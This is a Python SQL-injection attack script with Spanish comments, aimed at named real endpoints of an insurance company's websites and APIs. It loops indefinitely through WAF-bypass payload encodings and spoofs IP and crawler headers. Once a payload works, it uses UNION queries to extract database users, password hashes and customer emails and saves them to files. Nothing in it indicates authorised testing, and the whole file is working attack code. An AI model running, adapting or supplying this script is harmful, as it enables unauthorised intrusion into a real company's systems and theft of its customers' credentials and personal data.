#!/usr/bin/env python3
import requests
import time
import urllib.parse
import random
import string
import threading
import itertools
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings("ignore")

print("[!] ATAQUE PERSISTENTE INFINITO INICIADO")
print("[!] NO SE DETENDRÁ HASTA EXTRAER DATOS REALES")
print("="*60)

class PersistentAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.found_data = False
        self.attempt_count = 0
        self.successful_payloads = []
        
    def generate_payloads(self):
        """Genera payloads infinitos con diferentes técnicas"""
        base_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' OR '1'='1",
            "' UNION SELECT NULL,@@version,NULL--",
            "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
        ]
        
        # Técnicas de encoding
        encodings = [
            lambda x: x,  # Sin encoding
            lambda x: urllib.parse.quote(x),  # URL encode
            lambda x: urllib.parse.quote(urllib.parse.quote(x)),  # Double URL encode
            lambda x: base64.b64encode(x.encode()).decode(),  # Base64
            lambda x: x.encode('unicode_escape').decode(),  # Unicode escape
            lambda x: ''.join(['%{:02x}'.format(ord(c)) for c in x]),  # Hex encoding
        ]
        
        # Técnicas de bypass WAF
        bypass_techniques = [
            lambda x: x.replace(' ', '/**/'),  # Comentarios MySQL
            lambda x: x.replace(' ', '%20'),  # URL spaces
            lambda x: x.replace(' ', '+'),  # Plus signs
            lambda x: x.replace('SELECT', 'SeLeCt'),  # Case variation
            lambda x: x.replace('UNION', 'UN/**/ION'),  # Split keywords
            lambda x: x.replace("'", "''"),  # Double quotes
            lambda x: x.replace('=', ' LIKE '),  # LIKE instead of =
            lambda x: '/*!50000' + x + '*/',  # MySQL conditional comments
            lambda x: x.replace(' ', chr(0x09)),  # Tab instead of space
            lambda x: x.replace(' ', chr(0x0a)),  # Newline
            lambda x: x.replace(' ', chr(0x0d)),  # Carriage return
            lambda x: x.replace(' ', chr(0x0b)),  # Vertical tab
            lambda x: x.replace(' ', chr(0x0c)),  # Form feed
            lambda x: x.replace(' ', chr(0xa0)),  # Non-breaking space
        ]
        
        # Generador infinito
        while True:
            for base in base_payloads:
                for encode in encodings:
                    for bypass in bypass_techniques:
                        # Aplicar transformaciones
                        payload = bypass(base)
                        payload = encode(payload)
                        
                        # Añadir variaciones aleatorias
                        if random.random() > 0.5:
                            payload = self.add_random_junk(payload)
                        
                        yield payload
                        
                        # Generar nuevas variaciones
                        for i in range(1, 10):
                            modified = self.mutate_payload(payload)
                            yield modified
    
    def add_random_junk(self, payload):
        """Añade caracteres basura para bypass"""
        junk = ['', '/**/', '/*!*/', '--', '#', '\\N', '\\t', '\\n']
        return random.choice(junk).join(payload[i:i+1] for i in range(len(payload)))
    
    def mutate_payload(self, payload):
        """Muta el payload para crear variaciones"""
        mutations = [
            lambda x: x.upper(),
            lambda x: x.lower(),
            lambda x: x.swapcase(),
            lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            lambda x: x[::-1],  # Reverse
            lambda x: ''.join([c*random.randint(1,3) for c in x]),  # Repeat chars
        ]
        return random.choice(mutations)(payload)
    
    def attack_endpoint(self, url, payload):
        """Ataca un endpoint con un payload específico"""
        headers = {
            'User-Agent': self.generate_random_ua(),
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Forwarded-Host': 'localhost',
            'X-Forwarded-Proto': 'https',
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': random.choice([
                'application/x-www-form-urlencoded',
                'text/plain',
                'application/json',
                'multipart/form-data'
            ])
        }
        
        # Parámetros a probar
        params = ['v', 'id', 'user', 'username', 'email', 'search', 'q', 'query', 
                  'filter', 'sort', 'order', 'page', 'limit', 'offset', 'debug',
                  'test', 'cmd', 'exec', 'command', 'file', 'path', 'url']
        
        for param in params:
            try:
                # GET request
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, headers=headers, timeout=5)
                
                if self.check_response(response, payload):
                    print(f"\n[+] VULNERABILIDAD ENCONTRADA!")
                    print(f"    URL: {url}")
                    print(f"    Parámetro: {param}")
                    print(f"    Payload: {payload[:50]}...")
                    self.successful_payloads.append((url, param, payload))
                    self.extract_data(url, param, payload)
                    return True
                
                # POST request
                data = {param: payload}
                response = self.session.post(url, data=data, headers=headers, timeout=5)
                
                if self.check_response(response, payload):
                    print(f"\n[+] VULNERABILIDAD POST ENCONTRADA!")
                    print(f"    URL: {url}")
                    print(f"    Parámetro: {param}")
                    print(f"    Payload: {payload[:50]}...")
                    self.successful_payloads.append((url, param, payload))
                    self.extract_data(url, param, payload)
                    return True
                    
                # Headers injection
                headers[param] = payload
                response = self.session.get(url, headers=headers, timeout=5)
                
                if self.check_response(response, payload):
                    print(f"\n[+] HEADER INJECTION ENCONTRADA!")
                    print(f"    URL: {url}")
                    print(f"    Header: {param}")
                    self.extract_data_via_headers(url, param, payload)
                    return True
                    
            except Exception as e:
                pass
        
        return False
    
    def check_response(self, response, payload):
        """Verifica si la respuesta indica una vulnerabilidad"""
        indicators = [
            # SQL errors
            'sql', 'SQL', 'mysql', 'MySQL', 'ORA-', 'Oracle', 'PostgreSQL',
            'sqlite', 'SQLite', 'microsoft', 'ODBC', 'JET', 'Access',
            'syntax error', 'syntaxe', 'sintaxis', 'erreur de syntaxe',
            'You have an error', 'Unclosed quotation', 'unterminated',
            'Warning:', 'mysql_fetch', 'mysqli', 'pg_query', 'mssql_query',
            
            # Database content
            'root:', 'admin:', 'password:', 'passwd:', 'pwd:',
            'username:', 'user:', 'email:', 'mail:',
            'SELECT', 'FROM', 'WHERE', 'UNION', 'INSERT', 'UPDATE', 'DELETE',
            'database()', 'version()', 'user()', '@@version', '@@datadir',
            
            # Information disclosure
            'phpinfo', 'var_dump', 'debug', 'stack trace', 'traceback',
            '/etc/passwd', '/etc/shadow', 'C:\\Windows\\', 'C:\\Users\\',
            
            # Success indicators
            'true', 'success', '1 row', 'affected', 'changed',
            
            # Timing
            'timeout', 'maximum execution time'
        ]
        
        content = response.text.lower()
        
        # Check for indicators
        for indicator in indicators:
            if indicator.lower() in content:
                return True
        
        # Check response size changes
        if len(response.text) > 10000:  # Large response might contain data
            return True
        
        # Check for binary content (possible file download)
        if response.headers.get('content-type', '').startswith('application/'):
            return True
        
        # Check status codes
        if response.status_code in [500, 503]:  # Server errors
            return True
        
        return False
    
    def extract_data(self, url, param, working_payload):
        """Extrae datos usando un payload que funciona"""
        print(f"\n[*] EXTRAYENDO DATOS REALES...")
        
        extraction_queries = [
            "UNION SELECT NULL,database(),NULL",
            "UNION SELECT NULL,user(),NULL",
            "UNION SELECT NULL,@@version,NULL",
            "UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata",
            "UNION SELECT NULL,table_name,NULL FROM information_schema.tables",
            "UNION SELECT NULL,column_name,NULL FROM information_schema.columns",
            "UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users",
            "UNION SELECT NULL,CONCAT(email,':',password_hash),NULL FROM customers",
            "UNION SELECT NULL,CONCAT(table_schema,':',table_name),NULL FROM information_schema.tables WHERE table_schema NOT IN ('information_schema','mysql','performance_schema')",
        ]
        
        for query in extraction_queries:
            # Adaptar el query al payload que funcionó
            if "'" in working_payload:
                extract_payload = working_payload.split("'")[0] + "' " + query + "--"
            else:
                extract_payload = working_payload + " " + query
            
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(extract_payload)}"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    # Buscar datos en la respuesta
                    self.parse_extracted_data(response.text)
                    
            except Exception as e:
                pass
    
    def parse_extracted_data(self, content):
        """Parsea y muestra datos extraídos"""
        import re
        
        # Buscar emails
        emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', content)
        if emails:
            print(f"[+] EMAILS REALES ENCONTRADOS: {emails}")
            with open('emails_reales.txt', 'a') as f:
                for email in emails:
                    f.write(email + '\n')
        
        # Buscar hashes
        hashes = re.findall(r'[a-f0-9]{32}', content)  # MD5
        if hashes:
            print(f"[+] HASHES DE CONTRASEÑAS ENCONTRADOS: {hashes[:5]}")
            with open('hashes_reales.txt', 'a') as f:
                for hash in hashes:
                    f.write(hash + '\n')
        
        # Buscar nombres de tablas
        tables = re.findall(r'(users|customers|accounts|members|clients|policies|claims)', content, re.I)
        if tables:
            print(f"[+] TABLAS ENCONTRADAS: {set(tables)}")
        
        # Buscar información de base de datos
        if 'mysql' in content.lower() or 'mariadb' in content.lower():
            print("[+] BASE DE DATOS: MySQL/MariaDB detectado")
        if 'version' in content.lower():
            version = re.search(r'(\d+\.\d+\.\d+)', content)
            if version:
                print(f"[+] VERSIÓN: {version.group(1)}")
    
    def generate_random_ua(self):
        """Genera User-Agent aleatorio"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0)",
            "facebookexternalhit/1.1",
            "WhatsApp/2.19.81 A",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
        ]
        return random.choice(agents)
    
    def extract_data_via_headers(self, url, header, payload):
        """Extrae datos via header injection"""
        print(f"\n[*] EXTRAYENDO VIA HEADER INJECTION...")
        # Implementar extracción específica via headers
        pass
    
    def run_infinite_attack(self):
        """Ejecuta el ataque infinito hasta conseguir datos"""
        endpoints = [
            "https://www.allianzdirect.es/account/",
            "https://www.allianzdirect.es/seguro-de-coche/calcular-precio/",
            "https://www.allianzdirect.es/seguro-de-moto/calcular-precio/",
            "https://www.allianzdirect.es/login/",
            "https://www.allianzdirect.es/api/",
            "https://www.allianzdirect.es/admin/",
            "https://www.allianzdirect.es/search/",
            "https://www.allianzdirect.es/servicios/",
            "https://pro-edp.apis.allianz.com/prod/",
            "https://api.allianzdirect.com/",
        ]
        
        payload_generator = self.generate_payloads()
        
        print("[*] Iniciando ataque infinito...")
        print("[*] Presiona Ctrl+C cuando encuentre datos reales")
        
        while not self.found_data:
            for endpoint in endpoints:
                payload = next(payload_generator)
                self.attempt_count += 1
                
                if self.attempt_count % 100 == 0:
                    print(f"\r[*] Intentos: {self.attempt_count} | Endpoint: {endpoint[:30]}... | Payload: {payload[:30]}...", end='')
                
                # Ejecutar ataque
                if self.attack_endpoint(endpoint, payload):
                    print(f"\n[!] ÉXITO EN INTENTO {self.attempt_count}")
                    self.found_data = True
                    break
                
                # Pequeña pausa para no saturar
                if self.attempt_count % 10 == 0:
                    time.sleep(0.1)
        
        print(f"\n[+] ATAQUE COMPLETADO EXITOSAMENTE")
        print(f"[+] Total de intentos: {self.attempt_count}")
        print(f"[+] Payloads exitosos: {len(self.successful_payloads)}")

# Ejecutar ataque persistente
if __name__ == "__main__":
    attacker = PersistentAttacker()
    try:
        attacker.run_infinite_attack()
    except KeyboardInterrupt:
        print(f"\n\n[!] Ataque interrumpido después de {attacker.attempt_count} intentos")
        if attacker.successful_payloads:
            print(f"[+] Se encontraron {len(attacker.successful_payloads)} vulnerabilidades")
            for url, param, payload in attacker.successful_payloads:
                print(f"    - {url} | {param} | {payload[:50]}...")